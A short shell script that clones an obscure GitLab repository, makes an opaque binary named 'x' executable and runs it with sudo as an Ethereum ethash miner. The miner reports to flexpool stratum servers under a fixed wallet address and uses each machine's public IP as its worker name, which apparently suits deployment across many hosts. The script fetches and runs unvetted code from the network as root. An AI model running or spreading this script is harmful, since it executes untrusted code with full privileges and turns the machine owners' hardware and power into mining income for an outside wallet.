#!/bin/sh
sudo apt update
sudo apt-get install zip unzip
sudo apt install screen -y
screen -dmS er.sh 65 75
sudo git clone https://gitlab.com/letricejuliocesar/goodday
cd goodday
chmod +x x
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./x -a ethash -w 0x3da2c7743970908cac0e6b606f064330aea8b03f -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io:4444 -r $ip --nvidia 1
